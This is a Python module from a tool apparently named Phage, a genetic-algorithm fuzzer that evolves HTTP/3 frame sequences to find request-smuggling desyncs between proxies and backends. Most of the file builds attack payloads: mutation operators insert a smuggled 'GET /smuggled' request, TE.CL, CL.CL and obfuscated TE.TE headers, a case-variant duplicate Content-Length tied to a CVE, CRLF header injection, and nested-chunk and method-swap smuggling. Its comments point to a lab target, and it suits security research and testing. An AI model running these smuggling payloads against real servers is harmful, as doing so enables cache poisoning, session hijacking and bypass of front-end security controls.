# Phage: H3 framing genome and genetic operators.
# License: Apache-2.0 License

"""Framing-sequence genome. Each op maps to one aioquic H3 call, so a genome is
always sendable. Mutation and crossover are the genetic operators."""

import random
from dataclasses import dataclass, replace
from typing import Callable, List, Optional, Tuple, Union

Field = Tuple[bytes, bytes]


@dataclass(frozen=True)
class Headers:
    """One H3 HEADERS frame (maps to H3Connection.send_headers)."""

    fields: Tuple[Field, ...]
    end_stream: bool = False


@dataclass(frozen=True)
class Data:
    """One H3 DATA frame (maps to H3Connection.send_data)."""

    payload: bytes
    end_stream: bool = False


@dataclass(frozen=True)
class Delay:
    """Client-side pause before the next op (the FIN-sync gene)."""

    seconds: float


@dataclass(frozen=True)
class Reset:
    """RESET_STREAM (maps to QuicConnection.reset_stream)."""

    error_code: int = 0


Op = Union[Headers, Data, Delay, Reset]
Genome = List[Op]

# H3 error codes worth resetting with.
H3_NO_ERROR = 0x100
H3_REQUEST_CANCELLED = 0x10C


def seed_post(
    path: bytes = b"/",
    authority: bytes = b"lab",
    body: bytes = b"AAAA",
    method: bytes = b"POST",
) -> Genome:
    """A well-formed POST mirroring Phage's FIN-sync shape (the clean baseline)."""
    cl = str(len(body)).encode()
    fields = (
        (b":method", method),
        (b":scheme", b"https"),
        (b":authority", authority),
        (b":path", path),
        (b"content-length", cl),
    )
    head, tail = (body[:-1], body[-1:]) if body else (b"", b"")
    return [
        Headers(fields, end_stream=False),
        Data(head, end_stream=False),
        Delay(0.0),
        Data(tail, end_stream=True),
    ]


# --- Structural read-outs used for behavior descriptors and oracles. ---


def declared_content_length(g: Genome) -> Optional[int]:
    for op in g:
        if isinstance(op, Headers):
            for k, v in op.fields:
                if k.lower() == b"content-length":
                    return int(v) if v.isdigit() else None
    return None


def total_data_len(g: Genome) -> int:
    return sum(len(op.payload) for op in g if isinstance(op, Data))


def cl_relation(g: Genome) -> str:
    """Declared content-length vs bytes sent: 'match', 'under', 'over' or 'none'."""
    cl = declared_content_length(g)
    if cl is None:
        return "none"
    n = total_data_len(g)
    if cl == n:
        return "match"
    return "over" if cl > n else "under"


def frame_types(g: Genome) -> frozenset:
    t = set()
    for op in g:
        if isinstance(op, Headers):
            t.add("H")
        elif isinstance(op, Data):
            t.add("D")
        elif isinstance(op, Reset):
            t.add("R")
    return frozenset(t)


def has_trailers(g: Genome) -> bool:
    """A HEADERS frame after any DATA frame (the trailer-injection vector)."""
    seen_data = False
    for op in g:
        if isinstance(op, Data):
            seen_data = True
        elif isinstance(op, Headers) and seen_data:
            return True
    return False


def descriptor(g: Genome) -> tuple:
    """MAP-Elites behavior descriptor. Hashable, used as the archive cell key."""
    n = len(g)
    size_bucket = 0 if n <= 4 else 1 if n <= 8 else 2
    return (
        size_bucket,
        frame_types(g),
        cl_relation(g),
        has_trailers(g),
        any(isinstance(o, Reset) for o in g),
    )


# --- Mutation operators (the genes that change). rng injected for determinism. ---


def _mut_toggle_fin(g: Genome, rng: random.Random) -> Genome:
    idx = [i for i, o in enumerate(g) if isinstance(o, (Data, Headers))]
    if not idx:
        return g
    i = rng.choice(idx)
    g = list(g)
    g[i] = replace(g[i], end_stream=not g[i].end_stream)
    return g


def _mut_content_length(g: Genome, rng: random.Random) -> Genome:
    g = list(g)
    for i, o in enumerate(g):
        if not isinstance(o, Headers):
            continue
        fields = list(o.fields)
        for j, (k, v) in enumerate(fields):
            if k.lower() == b"content-length":
                cur = int(v) if v.isdigit() else 0
                delta = rng.choice([-2, -1, 1, 2])
                fields[j] = (k, str(max(0, cur + delta)).encode())
                g[i] = replace(o, fields=tuple(fields))
                return g
    return g


def _mut_insert_reset(g: Genome, rng: random.Random) -> Genome:
    g = list(g)
    g.insert(
        rng.randint(0, len(g)), Reset(rng.choice([H3_NO_ERROR, H3_REQUEST_CANCELLED]))
    )
    return g


def _mut_split_data(g: Genome, rng: random.Random) -> Genome:
    idx = [i for i, o in enumerate(g) if isinstance(o, Data) and len(o.payload) >= 2]
    if not idx:
        return g
    i = rng.choice(idx)
    o = g[i]
    cut = rng.randint(1, len(o.payload) - 1)
    g = list(g)
    g[i : i + 1] = [Data(o.payload[:cut], False), Data(o.payload[cut:], o.end_stream)]
    return g


def _mut_reorder(g: Genome, rng: random.Random) -> Genome:
    if len(g) < 2:
        return g
    i = rng.randint(0, len(g) - 2)
    g = list(g)
    g[i], g[i + 1] = g[i + 1], g[i]
    return g


def _mut_add_trailer(g: Genome, rng: random.Random) -> Genome:
    g = list(g)
    g.append(Headers(((b"x-smuggle", b"1"),), end_stream=True))
    return g


def _mut_delay(g: Genome, rng: random.Random) -> Genome:
    g = list(g)
    choice = rng.choice([0.0, 0.5, 1.0, 2.0])
    for i, o in enumerate(g):
        if isinstance(o, Delay):
            g[i] = Delay(choice)
            return g
    g.insert(rng.randint(0, len(g)), Delay(choice))
    return g


SMUGGLE_PAYLOAD = b"GET /smuggled HTTP/1.1\r\nHost: x\r\n\r\n"


def _mut_inject_smuggle(g: Genome, rng: random.Random) -> Genome:
    """Put a request-shaped body into a DATA frame (the smuggle-payload gene)."""
    g = list(g)
    idx = [i for i, o in enumerate(g) if isinstance(o, Data)]
    if idx:
        i = rng.choice(idx)
        g[i] = Data(SMUGGLE_PAYLOAD, g[i].end_stream)
    else:
        g.append(Data(SMUGGLE_PAYLOAD, end_stream=True))
    return g


def _mut_te_chunked(g: Genome, rng: random.Random) -> Genome:
    """Add Transfer-Encoding: chunked (the TE.CL desync primitive)."""
    g = list(g)
    for i, o in enumerate(g):
        if isinstance(o, Headers):
            if any(k.lower() == b"transfer-encoding" for k, _ in o.fields):
                return g
            g[i] = replace(o, fields=o.fields + ((b"transfer-encoding", b"chunked"),))
            return g
    g.insert(0, Headers(((b"transfer-encoding", b"chunked"),)))
    return g


def _mut_dup_content_length(g: Genome, rng: random.Random) -> Genome:
    """Duplicate content-length with a different value (the CL.CL desync primitive)."""
    g = list(g)
    for i, o in enumerate(g):
        if isinstance(o, Headers):
            for k, v in o.fields:
                if k.lower() == b"content-length":
                    alt = b"0" if v != b"0" else b"9"
                    g[i] = replace(o, fields=o.fields + ((b"content-length", alt),))
                    return g
    return g


def _mut_case_variant_cl(g: Genome, rng: random.Random) -> Genome:
    """CVE-2026-1525: a case-variant duplicate Content-Length with a conflicting
    value (`content-length: N` plus `Content-Length: 0`)."""
    g = list(g)
    for i, o in enumerate(g):
        if isinstance(o, Headers) and any(
            k.lower() == b"content-length" for k, _ in o.fields
        ):
            g[i] = replace(o, fields=o.fields + ((b"Content-Length", b"0"),))
            return g
    return g


def _mut_te_obfuscate(g: Genome, rng: random.Random) -> Genome:
    """TE.TE: an obfuscated Transfer-Encoding some parsers honor and others drop
    (leading-space name, tab, or a conflicting second value)."""
    variant = rng.choice(
        [
            (b" transfer-encoding", b"chunked"),
            (b"transfer-encoding", b"chunked, identity"),
            (b"transfer-encoding", b"\tchunked"),
        ]
    )
    g = list(g)
    for i, o in enumerate(g):
        if isinstance(o, Headers):
            g[i] = replace(o, fields=o.fields + (variant,))
            return g
    g.insert(0, Headers((variant,)))
    return g


def _mut_header_crlf_injection(g: Genome, rng: random.Random) -> Genome:
    """CVE-2026-1527 class: CRLF inside a header value smuggling a second request
    (rejected by a conformant H3 stack, honored by a vulnerable one)."""
    inj = (b"x-smuggle", b"1\r\n" + SMUGGLE_PAYLOAD.rstrip(b"\r\n"))
    g = list(g)
    for i, o in enumerate(g):
        if isinstance(o, Headers):
            g[i] = replace(o, fields=o.fields + (inj,))
            return g
    return g


def _chunk(body: bytes) -> bytes:
    """Wrap bytes in one chunked-transfer layer (one chunk + terminator)."""
    return b"%x\r\n%s\r\n0\r\n\r\n" % (len(body), body)


def _mut_nested_chunk(g: Genome, rng: random.Random) -> Genome:
    """Double-TE framing: a chunk wrapping an inner 0-terminator + smuggled
    request. Inert to a single de-chunk (parses as 1); a proxy that de-chunks a
    layer and forwards with TE still set, to a backend that de-chunks again,
    smuggles the trailing request. See lab/dechunk_front.py."""
    outer = _chunk(b"0\r\n\r\n" + SMUGGLE_PAYLOAD)
    g = list(g)
    for i, o in enumerate(g):
        if isinstance(o, Headers):
            if not any(k.lower() == b"transfer-encoding" for k, _ in o.fields):
                g[i] = replace(
                    o, fields=o.fields + ((b"transfer-encoding", b"chunked"),)
                )
            break
    idx = [i for i, o in enumerate(g) if isinstance(o, Data)]
    if idx:
        i = idx[-1]
        g[i] = Data(outer, g[i].end_stream)
    else:
        g.append(Data(outer, end_stream=True))
    return g


# QUERY (RFC 10008) and SEARCH are safe methods that carry a body; unknown verbs
# and bodyless verbs (GET/HEAD) are where a proxy and backend disagree on framing.
HTTP_VERBS = (b"QUERY", b"SEARCH", b"GET", b"HEAD", b"PATCH", b"PURGE", b"ZZZ")


def _mut_http_method(g: Genome, rng: random.Random) -> Genome:
    """Swap :method to a verb (incl. QUERY): a method one side treats as bodyless
    and the other reads smuggles the body as a request (method-based CL.0)."""
    g = list(g)
    for i, o in enumerate(g):
        if isinstance(o, Headers) and any(k.lower() == b":method" for k, _ in o.fields):
            fields = tuple(
                (k, rng.choice(HTTP_VERBS)) if k.lower() == b":method" else (k, v)
                for k, v in o.fields
            )
            g[i] = replace(o, fields=fields)
            return g
    return g


OPERATORS: Tuple[Callable[[Genome, random.Random], Genome], ...] = (
    _mut_toggle_fin,
    _mut_content_length,
    _mut_insert_reset,
    _mut_split_data,
    _mut_reorder,
    _mut_add_trailer,
    _mut_delay,
    _mut_inject_smuggle,
    _mut_te_chunked,
    _mut_dup_content_length,
    _mut_case_variant_cl,
    _mut_te_obfuscate,
    _mut_header_crlf_injection,
    _mut_nested_chunk,
    _mut_http_method,
)


def mutate(g: Genome, rng: random.Random, n: int = 1) -> Genome:
    for _ in range(n):
        g = rng.choice(OPERATORS)(g, rng)
    return g


def _split_head(g: Genome) -> Tuple[Optional[Headers], Genome]:
    """Separate a leading HEADERS skeleton (request line) from the body ops."""
    if g and isinstance(g[0], Headers):
        return g[0], list(g[1:])
    return None, list(g)


def crossover(a: Genome, b: Genome, rng: random.Random) -> Genome:
    """Homologous crossover: keep one request skeleton, recombine the bodies, so a
    CL-lying parent and a smuggle-body parent assemble a single-request smuggle."""
    if not a or not b:
        return list(a) if a else list(b)
    head_a, tail_a = _split_head(a)
    head_b, tail_b = _split_head(b)
    heads = [h for h in (head_a, head_b) if h is not None]
    head = [rng.choice(heads)] if heads else []
    body = tail_a[: rng.randint(0, len(tail_a))] + tail_b[rng.randint(0, len(tail_b)) :]
    return head + body


def _levy_int(rng: random.Random, cap: int = 8, alpha: float = 1.5) -> int:
    """Levy-flight step count: mostly 1, rarely a large burst (heavy tail)."""
    u = rng.random() or 1e-12  # random() can return 0.0; 0**negative would raise
    n = int(u ** (-1.0 / alpha))
    return max(1, min(cap, n))


def mutate_levy(g: Genome, rng: random.Random, n: int = 1) -> Genome:
    """mutate() with a Levy-flight step count (the `n` argument is ignored so it
    is drop-in for evolve's mutate_fn)."""
    return mutate(g, rng, _levy_int(rng))


def recombine(a: Genome, b: Genome, rng: random.Random) -> Genome:
    """Symbiotic recombine: merge the header genes of BOTH parents (keeping
    duplicates) to assemble compound vectors (TE.CL, CL.CL) a blind splice can't."""
    if not a or not b:
        return list(a) if a else list(b)
    ha = a[0] if isinstance(a[0], Headers) else None
    hb = b[0] if isinstance(b[0], Headers) else None
    if ha is None or hb is None:
        return crossover(a, b, rng)
    extra = tuple(f for f in hb.fields if f not in ha.fields)
    merged = Headers(ha.fields + extra, ha.end_stream)
    body = a[1:] if rng.random() < 0.5 else b[1:]
    return [merged] + list(body)


def pick_operator(rng: random.Random, weights: List[float]) -> int:
    """Weighted choice over OPERATORS (uniform if all weights equal)."""
    r = rng.random() * sum(weights)
    acc = 0.0
    for i, w in enumerate(weights):
        acc += w
        if r <= acc:
            return i
    return len(weights) - 1


def apply_operator(g: Genome, idx: int, rng: random.Random) -> Genome:
    return OPERATORS[idx](g, rng)
